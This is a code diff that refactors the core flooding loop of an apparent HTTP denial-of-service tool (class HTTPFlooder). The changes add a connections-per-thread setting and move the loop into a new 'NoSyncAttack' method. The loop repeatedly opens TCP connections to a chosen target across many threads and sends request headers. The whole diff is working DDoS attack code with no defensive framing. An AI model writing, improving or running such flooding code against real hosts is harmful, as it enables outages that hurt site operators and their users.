@@ -17,10 +17,10 @@ namespace GAS.Core
         private Random rnd = new Random();
         private bool random, usegZip, IPOrDns = true, Resp;
         private Thread[] WorkingThreads;
-        private volatile int _attacktype = 0;
+        private volatile int _attacktype = 0, SPT = 1;
         private volatile string AttackHeader = "";
         #endregion
-        public HTTPFlooder(string dns, string ip, int port, string subSite, bool resp, int delay, int timeout, bool random, bool usegzip,int threadcount,int attacktype=0)
+        public HTTPFlooder(string dns, string ip, int port, string subSite, bool resp, int delay, int timeout, bool random, bool usegzip,int threadcount,int attacktype=0,int connections_per_thread=1)
         {
             ThreadCount = threadcount;
             WorkingThreads = new Thread[ThreadCount];
@@ -63,83 +63,58 @@ namespace GAS.Core
         }
         private void bw_DoWork(object indexinthreads)
         {
-            #region Wait 4 init
-            while (!init)
-                Thread.Sleep(100);
+            while (!init) Thread.Sleep(100);//i know it's bad 
             int MY_INDEX_FOR_WORK = (int) indexinthreads;
-            #endregion
+            if (this.SPT==1)
+                NoSyncAttack(MY_INDEX_FOR_WORK);        
+        }
+
+        private void NoSyncAttack(int MY_INDEX_FOR_WORK)
+        {
             try
             {
-                #region Prepare
                 int bfsize = 1024; // this should be less than the MTU
                 byte[] recvBuf = new byte[bfsize];
                 int recvd = 0;
-                byte[] buf;
-                #region Headers
-                buf = GetHeaderBytes();
-                #endregion
-                #endregion
-                #region DDos
+                byte[] buf = GetHeaderBytes();
                 while (IsFlooding)
                 {
-                    if (random)
-                        buf = GetHeaderBytes();
-                    States[MY_INDEX_FOR_WORK] =  ReqState.Ready;
-                    recvBuf = new byte[bfsize];
-                    #region Connect
+                    if (random) buf = GetHeaderBytes();
+                    States[MY_INDEX_FOR_WORK] = ReqState.Ready;
                     rSocket socket = new rSocket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-                    States[MY_INDEX_FOR_WORK] = ReqState.Connecting;
-                    #region Blocking IO
-                        try { socket.Connect(this.IPOrDns ? this.IP.ToString() : this.DNS, this.Port); } catch { continue; }
-                    #endregion
-                    #region Async IO
-                    /*
-                        try
-                        {
-                            var a = new SocketAsyncEventArgs()
-                            {
-                                RemoteEndPoint = new IPEndPoint(this.IPOrDns ? IP : Dns.GetHostAddresses(this.DNS)[0], this.Port)
-
-                            };
-                            a.Completed+=
-                            socket.ConnectAsync(a);
-                        }
-                        catch { }*/
-                    #endregion
-                    socket.Blocking = Resp;
-                    States[MY_INDEX_FOR_WORK] = ReqState.Requesting;
-                    #region Blocking IO
-                        try { socket.Send(buf, SocketFlags.None); }
-                        catch { }
-                    #endregion
-                    //socket.SendAsync(buf, SocketFlags.None);
-                    #endregion
-                    States[MY_INDEX_FOR_WORK] = ReqState.Downloading;
+                    try
+                    {
+                        States[MY_INDEX_FOR_WORK] = ReqState.Connecting;
+                        socket.Connect(this.IPOrDns ? this.IP.ToString() : this.DNS, this.Port);
+                        socket.Blocking = Resp;
+                        States[MY_INDEX_FOR_WORK] = ReqState.Requesting;
+                        socket.Send(buf, SocketFlags.None);
+                        States[MY_INDEX_FOR_WORK] = ReqState.Downloading;
                         Requested++;
-                        #region Download page
                         if (Resp)
                         {
                             try
                             {
                                 recvd = 0;
-                                #region Blocking IO
                                 do { recvd = socket.Receive(recvBuf); }
                                 while (false);//(recvd > bfsize) && socket.Connected);
-                                #endregion
                                 Downloaded++;
                             }
                             catch { Failed++; }
                         }
-                        #endregion
-                        States[MY_INDEX_FOR_WORK] = ReqState.Completed; 
+                        States[MY_INDEX_FOR_WORK] = ReqState.Completed;
                         Downloaded++;
-                    if (Delay > 0) System.Threading.Thread.Sleep(Delay + 1);
+                        if (Delay > 0) System.Threading.Thread.Sleep(Delay + 1);
+                    }
+                    catch
+                    {
+
+                    }
                     socket.Dispose();
                 }
-                #endregion
-            } 
+            }
             catch { }
-            finally {}            
+            finally { }
         }
         byte[] GetHeaderBytes()
         {
